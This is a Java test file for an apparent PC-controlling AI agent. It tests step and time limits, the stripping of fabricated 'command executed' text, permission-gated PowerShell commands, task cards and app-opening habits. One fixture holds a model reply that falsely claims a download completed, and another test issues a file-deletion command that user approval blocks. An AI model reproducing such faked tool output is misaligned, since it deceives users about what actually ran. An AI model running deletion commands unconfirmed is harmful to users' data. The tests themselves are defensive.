        assertEquals(ChatAgent.MAX_FAILS, o.steps);
        assertTrue(o.text.contains("没有进展"));
        ChatAgent a2 = new ChatAgent();
        AtomicLong now = new AtomicLong(0);
        a2.clock = now::get;
        a2.timeoutMs = 60_000;
        ChatAgent.Brain b2 = (m, t) -> { now.addAndGet(30_000); return call("c" + n.get(), "run_command", rc("等", "Get-Date -Format " + n.incrementAndGet())); };
        ChatAgent.Outcome o2 = a2.run(new ArrayList<>(List.of(Llm.msg("user", "x"))), b2, (c, args) -> Actions.Result.ok("ok"), t -> { });
        assertEquals("time_limit", o2.status);
        assertTrue(o2.text.contains("时长上限"));
    }

    @Test public void fakeStepTextIsStrippedAndSentBack() {
        String fake = "继续下载。\n▶ 执行命令：Invoke-WebRequest https://x/m.apk -OutFile m.apk\n✓ 下载完成\n现在装进 MuMu。";
        assertEquals("继续下载。\n现在装进 MuMu。", ChatAgent.stripFakeSteps(fake).replaceAll("\n+", "\n"));
        List<List<Map<String, Object>>> seen = new ArrayList<>();
        AtomicInteger n = new AtomicInteger();
        ChatAgent.Brain b = (m, t) -> { seen.add(new ArrayList<>(m)); return n.incrementAndGet() == 1 ? say(fake) : n.get() == 2 ? call("1", "run_command", rc("下载", "Get-Date")) : say("好了"); };
        List<String> ran = new ArrayList<>();
        ChatAgent.Outcome o = new ChatAgent().run(new ArrayList<>(List.of(Llm.msg("user", "继续"))), b, (c, args) -> { ran.add(c); return Actions.Result.ok("ok"); }, t -> { });
        assertEquals("打回后真的执行了", 1, ran.size());
        assertTrue(String.valueOf(seen.get(1).get(seen.get(1).size() - 1).get("content")).contains("没有真正调用工具"));
        assertEquals("好了", o.text);
    }

    @Test public void taskCardRecordsStepsWithDescriptionsAndStopReason() throws Exception {
        Store s = new Store(Files.createTempDirectory("ap").resolve("state.json"));
        Chat ch = new Chat(new Config(Files.createTempFile("ap", ".properties")), s, new Main.TestActions(), List::of, x -> { });
        AtomicInteger n = new AtomicInteger();
        ch.brain = (m, t) -> n.incrementAndGet() == 1 ? call("1", "run_command", rc("查 MuMu 装在哪", "Get-ChildItem C:\\")) : call("2", "run_command", rc("删掉旧文件", "Remove-Item x"));
        ch.pcExec = (cmd, args) -> String.valueOf(args.get("command")).startsWith("Remove") ? new Actions.Result(false, "电脑上拒绝了", new TreeMap<>(Map.of("reason", LinkPolicy.R_CONFIRM_DENIED)))
                : Actions.Result.ok("命令执行完了", new TreeMap<>(Map.of("output", "MuMu\nother", "exit", 0L)));
        Map<String, Object> card = ch.send("帮我查一下 MuMu 装在哪然后把旧文件删掉", "text");
        assertEquals("task", card.get("via"));
        assertEquals("denied", card.get("state"));
        assertTrue("停下有原因", String.valueOf(card.get("answer")).contains("拒绝"));
        List<?> steps = (List<?>) card.get("steps");
        Map<?, ?> s1 = (Map<?, ?>) steps.get(0);
        assertEquals("查 MuMu 装在哪", s1.get("desc"));
        assertEquals("ok", s1.get("state"));
        assertEquals("MuMu\nother", s1.get("output"));
        assertEquals("fail", ((Map<?, ?>) steps.get(1)).get("state"));
        // 下一轮给模型的是「程序记录」，不在助手嘴里（免得模型学着把步骤当文字写）
        boolean recordAsUser = false;
        for (Map<String, Object> m : ch.context())
            if ("user".equals(m.get("role")) && String.valueOf(m.get("content")).contains("程序记录")) recordAsUser = true;
            else if ("assistant".equals(m.get("role"))) assertFalse(String.valueOf(m.get("content")).contains("▶"));
        assertTrue(recordAsUser);
    }

    @Test public void notificationsKeepOnlyRemindersApprovalsGoToPermLog() throws Exception {
        Card card = new Card();
        card.answer = PcGuard.ALLOW;
        PcGuard g = guard(cfg(), card);
        sh(g, "t1", "winget install --id A.B");
        assertFalse(g.permLogView().isEmpty());
        Map<?, ?> rec = (Map<?, ?>) g.permLogView().get(0);
        assertEquals("允许一次", rec.get("result"));
        assertEquals("t1", rec.get("task"));
    }

    // ------------------------------------------------------------------ 打开：本地应用 / 网页，习惯

    @Test public void openTargetDecidesAppWebAskAndHabits() {
        Map<String, Map<String, Object>> none = Map.of();
        assertArrayEquals(new String[] {"ask"}, OpenTarget.decide("bilibili", "哔哩哔哩", "https://www.bilibili.com", "打开 B站", "", none));
        assertArrayEquals("只有本地应用", new String[] {"app", "哔哩哔哩"}, OpenTarget.decide("bilibili", "哔哩哔哩", "", "打开 B站", "", none));
        assertArrayEquals("只有网页", new String[] {"web", "https://www.bilibili.com"}, OpenTarget.decide("bilibili", null, "https://www.bilibili.com", "打开 B站", "", none));
        assertArrayEquals("原话说了网页", new String[] {"web", "https://www.bilibili.com"}, OpenTarget.decide("bilibili", "哔哩哔哩", "https://www.bilibili.com", "用网页打开b站", "", none));
        assertArrayEquals("模型说用户要网页", new String[] {"web", "https://www.bilibili.com"}, OpenTarget.decide("bilibili", "哔哩哔哩", "https://www.bilibili.com", "打开", "web", none));
        Map<String, Map<String, Object>> h = OpenTarget.parseHabits("{\"bilibili\":{\"choice\":\"web\",\"app\":\"\"},\"bad\":{\"choice\":\"x\"}}");
        assertEquals("坏的习惯不收", 1, h.size());
        assertArrayEquals("按习惯，不再问", new String[] {"web", "https://www.bilibili.com"}, OpenTarget.decide("bilibili", "哔哩哔哩", "https://www.bilibili.com", "打开 B站", "", h));
        assertArrayEquals(new String[] {"none"}, OpenTarget.decide("x", null, "", "打开 x", "", none));
        assertEquals("bilibili", OpenTarget.key("B站"));
        assertEquals("bilibili", OpenTarget.key("哔哩哔哩"));
        assertEquals("https://www.bilibili.com", OpenTarget.knownUrl("b站"));
        assertEquals("按已知的应用名找", "哔哩哔哩", OpenTarget.findApp("B站", n -> n.equals("哔哩哔哩") ? "哔哩哔哩" : null));
        assertNull(OpenTarget.findApp("B站", n -> null));
        // 商店应用（Get-StartApps）
        LocalLaunch.setStartApps(List.of(new String[] {"哔哩哔哩", "Bilibili.Bilibili_xyz!App"}, new String[] {"Windows PowerShell", "{x}\\powershell.exe"}));
        try {
            assertEquals("Bilibili.Bilibili_xyz!App", LocalLaunch.findStartApp("哔哩哔哩")[1]);
            assertNull(LocalLaunch.findStartApp("Windows PowerShell"));
            assertEquals("哔哩哔哩", LocalLaunch.displayName("哔哩哔哩", Map.of(), Map.of()));
        } finally { LocalLaunch.setStartApps(null); }
    }

    @Test public void openTargetAsksOnTheCardAndRemembers() throws Exception {
        Store s = new Store(Files.createTempDirectory("ap").resolve("state.json"));
        Config c = new Config(Files.createTempFile("ap", ".properties"));
        Chat ch = new Chat(c, s, new Main.TestActions(), List::of, x -> { });
        ch.appResolver = n -> n.equals("哔哩哔哩") ? "哔哩哔哩" : null;
        List<String> opened = new ArrayList<>();
        ChatAgent.Exec pe = (cmd, a) -> { opened.add(cmd + " " + a); return Actions.Result.ok("已打开"); };
        Thread clicker = new Thread(() -> {
            for (int i = 0; i < 200; i++) {
                List<Object> l = ch.choices.list();
                if (!l.isEmpty()) { ch.choices.answer(((Number) ((Map<?, ?>) l.get(0)).get("id")).intValue(), "app", true); return; }
                try { Thread.sleep(10); } catch (InterruptedException e) { return; }
            }
        });
        clicker.start();
        Actions.Result r = ch.openTarget(pe, new TreeMap<>(Map.of("name", "B站")));
        clicker.join();
        assertTrue(r.text, r.ok);
        assertEquals("open_app {name=哔哩哔哩}", opened.get(0));
        assertTrue(r.text.contains("本地应用"));
        assertEquals("app", OpenTarget.parseHabits(c.openHabits).get("bilibili").get("choice"));
        // 第二次：按习惯直接开，不再问
        Actions.Result r2 = ch.openTarget(pe, new TreeMap<>(Map.of("name", "哔哩哔哩")));
        assertTrue(r2.text.contains("习惯"));
        assertTrue(ch.choices.list().isEmpty());
        // 原话说网页：直接网页
        s.add("chat", new TreeMap<>(Map.of("role", "user", "text", "用网页打开b站")), 0);
        ch.openTarget(pe, new TreeMap<>(Map.of("name", "b站")));
        assertEquals("open_url {url=https://www.bilibili.com}", opened.get(2));
        // 没人选：不打开，如实说
        ch.choices.timeoutMs = 50;
        c.openHabits = "";
        s.add("chat", new TreeMap<>(Map.of("role", "user", "text", "打开b站")), 0);
        assertFalse(ch.openTarget(pe, new TreeMap<>(Map.of("name", "b站"))).ok);
        assertEquals(3, opened.size());
    }

    @Test public void uiHasTaskCardInlineApprovalChoiceAndPermLog() throws Exception {
        String html;
        try (java.io.InputStream in = App.class.getResourceAsStream("/onesay/ui/index.html")) { html = new String(in.readAllBytes(), java.nio.charset.StandardCharsets.UTF_8); }
        for (String must : new String[] {"function taskCard(", "允许本次任务", "这次运行都允许", "允许一次", "详情", "展开全部", "已收到，下一步处理", "记住我的选择",
                "本地应用（", "权限记录", "以后不用问的命令", "打开习惯", "对话权限预设", "chat_preset", "chat_timeout_min", "停止"})
            assertTrue(must, html.contains(must));
        // 本机对话的批准不在右下角浮框里（在任务卡里点）
        assertTrue(html.contains("x.from!=='本机对话'"));
        // 发送不再被正在跑的任务挡住
        assertFalse(html.contains("if(!t||pending)return"));
    }
}
